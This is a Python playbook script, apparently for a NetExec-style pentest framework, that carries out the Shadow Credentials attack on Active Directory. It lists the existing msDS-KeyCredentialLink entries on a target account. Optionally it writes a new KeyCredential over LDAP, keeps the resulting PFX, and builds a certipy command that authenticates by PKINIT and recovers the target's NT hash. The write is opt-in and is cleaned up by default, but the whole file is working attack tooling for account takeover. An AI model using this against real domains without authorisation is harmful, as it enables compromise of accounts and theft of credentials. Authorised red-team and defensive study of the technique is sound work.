"""Shadow Credentials: list existing key credentials, optionally stage one, hand off to PKINIT.

Shadow Credentials writes an ``msDS-KeyCredentialLink`` (a raw public key) onto a
target account you can write to, then authenticates as that target with PKINIT using
the matching certificate and recovers its NT hash via UnPAC-the-hash. The PKINIT +
UnPAC step is EXTERNAL (certipy / nxc), so this chain stages the KeyCredential and
the PFX and then *hands off* — like rbcd_takeover reports its ccache path, this one
always reports the PFX path for the operator to continue with. It does not itself
perform PKINIT or crack the hash.

This chain is detection-first. With no ``NXC_SHADOW_WRITE`` it only lists the
KeyCredentials already present on the target (read-only). Set ``NXC_SHADOW_WRITE=1``
to perform the active LDAP write that adds a KeyCredential; by default it is then
cleaned up again (removed) so nothing is left behind.

Configuration is read from the environment so the chain never runs by accident:

    NXC_SHADOW_TARGET    target sAMAccountName, e.g. WS01$                   (required)
    NXC_SHADOW_WRITE     set to 1 to actually add a KeyCredential (active)   (default off)
    NXC_SHADOW_CLEANUP   set to 0 to keep the added KeyCredential            (default 1 = remove)

    export NXC_SHADOW_TARGET='WS01$' NXC_SHADOW_WRITE=1
    nxc playbook dc.example.test examples/playbooks/chains/shadow_credentials.py \
        -u operator -p 'PASSWORD' -d example.test

The finding is ``success`` only when a KeyCredential was staged and a PFX was
produced (NXC_SHADOW_WRITE=1); otherwise it is read-only/negative and ``data`` still
lists the existing KeyCredentials found on the target.
"""

import os
from dataclasses import dataclass, field


@dataclass
class ShadowCredentials:
    target: str
    write: bool = False
    cleanup: bool = False
    target_dn: str | None = None
    existing_count: int = 0
    existing_device_ids: list[str] = field(default_factory=list)
    added: bool = False
    device_id: str | None = None
    pfx_path: str | None = None
    domain: str | None = None
    pkinit_command: str | None = None
    cleaned_up: bool | None = None
    reached: bool = False
    reason: str | None = None
    evidence_indices: list[int] = field(default_factory=list)


def _env(name, default=None):
    value = os.environ.get(name, "").strip()
    return value or default


def _print_summary(data):
    lines = ["", "=" * 68, f" {data.target}   SHADOW CREDENTIALS", "=" * 68]
    lines.append(f"  Existing KeyCredentials: {data.existing_count}")
    lines.extend(f"    - {device_id}" for device_id in data.existing_device_ids)
    lines.append(f"  Mode: {'active write' if data.write else 'read-only (list only)'}")
    if data.added:
        lines.append(f"  Staged KeyCredential device ID: {data.device_id}")
        lines.append(f"  PFX (handoff): {data.pfx_path}")
        if data.pkinit_command:
            lines.append("  Next (external PKINIT + UnPAC-the-hash):")
            lines.append(f"    {data.pkinit_command}")
        if data.cleaned_up is not None:
            lines.append(f"  Cleanup: {'removed' if data.cleaned_up else 'FAILED to remove — remove it manually'}")
    lines.append("-" * 68)
    lines.append(f"  VERDICT: {data.reason}" if data.reason else "  VERDICT: KeyCredential staged; PFX reported for PKINIT handoff")
    lines.append("=" * 68)
    print("\n".join(lines), flush=True)


def run(host):
    host.defaults(stop_on_error=False)
    target = _env("NXC_SHADOW_TARGET")
    write = _env("NXC_SHADOW_WRITE") == "1"
    cleanup = _env("NXC_SHADOW_CLEANUP", "1") == "1"
    data = ShadowCredentials(target=target or "", write=write, cleanup=cleanup)

    with host.evidence() as ev:

        def finish(reason=None):
            data.reason = reason
            data.evidence_indices = list(ev.indices)
            _print_summary(data)
            return host.finding("shadow_credentials", ok=data.reached, data=data, inputs={"target": data.target, "write": write, "cleanup": cleanup, "evidence": ev.indices})

        if not target:
            return finish("Set NXC_SHADOW_TARGET to a target sAMAccountName (e.g. WS01$)")

        ldap = host.ldap()
        if not ldap.authenticated:
            return finish("Directory authentication was not established")
        data.domain = getattr(ldap.connection, "domain", None)

        # Step 1 — list the KeyCredentials already present on the target (read-only).
        listed = ldap.module("shadow-creds", target=target, action="list")
        data.target_dn = getattr(listed.data, "target_dn", None)
        data.existing_count = int(getattr(listed.data, "count", 0) or 0)
        data.existing_device_ids = [info.device_id for info in getattr(listed.data, "credentials", []) or [] if getattr(info, "device_id", None)]

        # Step 2 — read-only stops here unless the operator opted into the active write.
        if not write:
            return finish("read-only: existing KeyCredentials listed; set NXC_SHADOW_WRITE=1 to stage one")

        # Step 3 — active LDAP write: add a KeyCredential and keep the PFX for handoff.
        added = ldap.module("shadow-creds", target=target, action="add", stop_on_error=False)
        data.device_id = getattr(added.data, "device_id", None)
        data.pfx_path = getattr(added.data, "pfx_path", None)
        data.added = bool(added.ok and getattr(added.data, "modified", False))
        if not data.added or not data.pfx_path:
            return finish(added.error or "KeyCredential write did not produce a usable PFX")

        data.reached = True
        dc = host.target
        username = target.rstrip("$")
        domain = data.domain or "<domain>"
        data.pkinit_command = f"certipy auth -pfx {data.pfx_path} -dc-ip {dc} -username {username} -domain {domain}"

        # Step 4 — remove the KeyCredential we added so nothing is left behind.
        if cleanup and data.device_id:
            removed = ldap.module("shadow-creds", target=target, action="remove", device_id=data.device_id, stop_on_error=False)
            data.cleaned_up = bool(removed.ok and getattr(removed.data, "modified", False))

        return finish(None)
